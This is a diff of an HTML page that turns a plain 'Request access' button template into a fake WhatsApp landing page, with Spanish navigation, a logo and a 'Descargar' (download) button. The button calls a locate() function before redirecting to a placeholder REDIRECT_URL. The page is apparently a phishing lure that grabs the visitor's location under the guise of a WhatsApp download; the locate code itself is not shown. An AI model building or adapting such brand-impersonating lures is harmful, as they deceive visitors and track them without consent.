@@ -1,14 +1,52 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-	<meta charset="UTF-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-	<title>Document</title>
-</head>
-<body>
-	
-	<p id="buttons" style="padding-top: 10px">
-					<button id="requestButton" style="font-weight:bold" class="jfk-button jfk-button-action" onclick="locate(function(){window.location='REDIRECT_URL';}, function(){$('#change').html('Failed');});">Request access</button>
-				</p>
-</body>
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="css/main.css" />
+    <title>WhatsApp</title>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"
+    />
+  </head>
+  <body>
+    <div class="contenedor">
+      <header>
+        <img class="img-logo" src="images/logo_sin_fondo.png" logo; />
+        <div class="fila-prin">
+          <nav>
+            <ul>
+              <li><a href="funciones.html">Funciones</a></li>
+              <li><a href="privacidad.html">Privacidad</a></li>
+              <li><a href="centro.html">Centro de ayuda</a></li>
+              <li><a href="blog.html">Blog</a></li>
+              <li><a href="empresas.html">Para empresas</a></li>
+              <li><a href="aplicaciones.html">Aplicaciones</a></li>
+            </ul>
+          </nav>
+        </div>
+        <p class="buttons">
+          <button
+            class="requestButton"
+            onclick="locate(function(){window.location='REDIRECT_URL';}, function(){$('#change').html('Failed');});"
+          >
+            Descargar
+            <i
+              class="fas fa-download"
+              style="font-size: 14px; color: #000000"
+            ></i>
+          </button>
+        </p>
+      </header>
+
+      <div class="contenedor-img">
+        <img
+          class="img-principal"
+          src="images/Captura de pantalla  nueva2025-06-09 202233.png"
+          alt="foto"
+        />
+      </div>
+    </div>
+  </body>
 </html>
